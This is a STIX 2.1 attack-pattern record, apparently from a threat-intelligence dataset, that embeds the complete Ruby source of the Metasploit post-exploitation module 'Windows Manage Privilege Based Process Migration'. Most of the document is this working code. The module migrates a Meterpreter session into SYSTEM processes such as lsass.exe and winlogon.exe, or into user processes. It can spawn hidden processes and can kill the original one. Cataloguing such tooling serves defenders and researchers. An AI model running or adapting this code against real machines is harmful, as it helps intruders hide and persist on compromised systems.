{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--16fdb7c4-cb05-4b66-a427-aa1622bf1a78",
    "created": "2024-08-14T16:33:04.985775Z",
    "modified": "2024-08-14T16:33:04.985779Z",
    "name": "Windows Manage Privilege Based Process Migration ",
    "description": " This module will migrate a Meterpreter session based on session privileges. It will do everything it can to migrate, including spawning a new User level process. For sessions with Admin rights: It will try to migrate into a System level process in the following order: ANAME (if specified), services.exe, wininit.exe, svchost.exe, lsm.exe, lsass.exe, and winlogon.exe. If all these fail and NOFAIL is set to true, it will fall back to User level migration. For sessions with User level rights: It will try to migrate to a user level process, if that fails it will attempt to spawn the process then migrate to it. It will attempt the User level processes in the following order: NAME (if specified), explorer.exe, then notepad.exe.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/manage/priv_migrate.rb",
            "external_id": "priv_migrate.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::Windows::Priv\n\n  DEFAULT_ADMIN_TARGETS = [ 'services.exe', 'wininit.exe', 'svchost.exe', 'lsm.exe', 'lsass.exe', 'winlogon.exe' ]\n  DEFAULT_USER_TARGETS = [ 'explorer.exe', 'notepad.exe' ]\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Manage Privilege Based Process Migration ',\n        'Description' => %q{\n          This module will migrate a Meterpreter session based on session privileges.\n          It will do everything it can to migrate, including spawning a new User level process.\n          For sessions with Admin rights: It will try to migrate into a System level process in the following\n          order: ANAME (if specified), services.exe, wininit.exe, svchost.exe, lsm.exe, lsass.exe, and winlogon.exe.\n          If all these fail and NOFAIL is set to true, it will fall back to User level migration. For sessions with User level rights:\n          It will try to migrate to a user level process, if that fails it will attempt to spawn the process\n          then migrate to it. It will attempt the User level processes in the following order:\n          NAME (if specified), explorer.exe, then notepad.exe.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Josh Hale \"sn0wfa11\" <jhale85446[at]gmail.com>',\n          'theLightCosine'\n        ],\n        'Platform' => ['win' ],\n        'SessionTypes' => ['meterpreter' ],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              core_migrate\n              stdapi_sys_config_getuid\n              stdapi_sys_process_attach\n              stdapi_sys_process_execute\n              stdapi_sys_process_get_processes\n              stdapi_sys_process_kill\n            ]\n          }\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('ANAME', [false, 'System process to migrate to. For sessions with Admin rights. (See Module Description.)']),\n        OptString.new('NAME', [false, 'Process to migrate to. For sessions with User rights. (See Module Description.)']),\n        OptBool.new('KILL', [true, 'Kill original session process.', false]),\n        OptBool.new('NOFAIL', [true, 'Migrate to user level process if Admin migration fails. May downgrade privileged shells.', false])\n      ]\n    )\n  end\n\n  def run\n    # Get current process information\n    @original_pid = client.sys.process.open.pid\n    @original_name = client.sys.process.open.name.downcase\n    print_status(\"Current session process is #{@original_name} (#{@original_pid}) as: #{client.sys.config.getuid}\")\n    unless migrate_admin\n      if is_admin? && !datastore['NOFAIL']\n        print_status('NOFAIL set to false, exiting module.')\n        return\n      end\n      migrate_user\n    end\n  end\n\n  # This function returns the first process id of a process with the name provided.\n  # It will make sure that the process has a visible user meaning that the session has rights to that process.\n  # Note: \"target_pid = session.sys.process[proc_name]\" will not work when \"include Msf::Post::Windows::Priv\" is in the module.\n  #\n  # @return [Integer] the PID if one is found\n  # @return [NilClass] if no PID was found\n  def get_pid(proc_name)\n    processes = client.sys.process.get_processes\n    processes.each do |proc|\n      if proc['name'].downcase == proc_name && proc['user'] != ''\n        return proc['pid']\n      end\n    end\n    return nil\n  end\n\n  # This function will try to kill the original session process\n  #\n  # @return [void] A useful return value is not expected here\n  def kill(proc_pid, proc_name)\n    if datastore['KILL']\n      begin\n        print_status(\"Trying to kill original process #{proc_name} (#{proc_pid})\")\n        session.sys.process.kill(proc_pid)\n        print_good(\"Successfully killed process #{proc_name} (#{proc_pid})\")\n      rescue ::Rex::Post::Meterpreter::RequestError => e\n        print_error(\"Could not kill original process #{proc_name} (#{proc_pid})\")\n        print_error(e.to_s)\n      end\n    end\n  end\n\n  # This function attempts to migrate to the specified process.\n  #\n  # @return [TrueClass] if it successfully migrated\n  # @return [FalseClass] if it failed to migrate\n  def migrate(target_pid, proc_name, current_pid)\n    if !target_pid\n      print_error(\"Could not migrate to #{proc_name}.\")\n      return false\n    end\n\n    print_status(\"Trying #{proc_name} (#{target_pid})\")\n\n    if target_pid == current_pid\n      print_good(\"Already in #{client.sys.process.open.name} (#{client.sys.process.open.pid}) as: #{client.sys.config.getuid}\")\n      return true\n    end\n\n    begin\n      client.core.migrate(target_pid)\n      print_good(\"Successfully migrated to #{client.sys.process.open.name} (#{client.sys.process.open.pid}) as: #{client.sys.config.getuid}\")\n      return true\n    rescue ::Rex::Post::Meterpreter::RequestError => e\n      print_error(\"Could not migrate to #{proc_name}.\")\n      print_error(e.to_s)\n      return false\n    rescue ::Rex::RuntimeError => e\n      print_error(\"Could not migrate to #{proc_name}.\")\n      print_error(e.to_s)\n      return false\n    end\n  end\n\n  # Attempts to migrate into one of the Target Admin Processes.\n  #\n  # @return [TrueClass] if it successfully migrated\n  # @return [FalseClass] if it failed to migrate\n  def migrate_admin\n    if is_admin?\n      # Populate target array and Downcase all Targets\n      admin_targets = DEFAULT_ADMIN_TARGETS.dup\n      admin_targets.unshift(datastore['ANAME']) if datastore['ANAME']\n      admin_targets.map!(&:downcase)\n\n      if is_system?\n        print_status('Session is already Admin and System.')\n        if admin_targets.include? @original_name\n          print_good(\"Session is already in target process: #{@original_name}.\")\n          return true\n        end\n      else\n        print_status('Session is Admin but not System.')\n      end\n      print_status('Will attempt to migrate to specified System level process.')\n\n      # Try to migrate to each of the System level processes in the list.  Stop when one works.  Go to User level migration if none work.\n      admin_targets.each do |target_name|\n        if migrate(get_pid(target_name), target_name, @original_pid)\n          kill(@original_pid, @original_name)\n          return true\n        end\n      end\n      print_error('Unable to migrate to any of the System level processes.')\n    else\n      print_status('Session has User level rights.')\n    end\n    false\n  end\n\n  # Attempts to migrate to one of the Target User Processes\n  #\n  # @return [TrueClass] if it successfully migrated\n  # @return [FalseClass] if it failed to migrate\n  def migrate_user\n    # Populate Target Array and Downcase all Targets\n    user_targets = DEFAULT_USER_TARGETS.dup\n    user_targets.unshift(datastore['NAME']) if datastore['NAME']\n    user_targets.map!(&:downcase)\n\n    print_status('Will attempt to migrate to a User level process.')\n\n    # Try to migrate to user level processes in the list.  If it does not exist or cannot migrate, try spawning it then migrating.\n    user_targets.each do |target_name|\n      if migrate(get_pid(target_name), target_name, @original_pid)\n        kill(@original_pid, @original_name)\n        return true\n      end\n\n      if migrate(spawn(target_name), target_name, @original_pid)\n        kill(@original_pid, @original_name)\n        return true\n      end\n    end\n    false\n  end\n\n  # This function will attempt to spawn a new process of the type provided by the name.\n  #\n  # @return [Integer] the PID if the process spawned successfully\n  # @return [NilClass] if the spawn failed\n  def spawn(proc_name)\n    print_status(\"Attempting to spawn #{proc_name}\")\n    proc = session.sys.process.execute(proc_name, nil, { 'Hidden' => true })\n    print_good(\"Successfully spawned #{proc_name}\")\n    return proc.pid\n  rescue ::Rex::Post::Meterpreter::RequestError => e\n    print_error(\"Could not spawn #{proc_name}.\")\n    print_error(e.to_s)\n    return nil\n  end\nend\n",
    "x_mitre_platforms": [
        "['win' ]"
    ]
}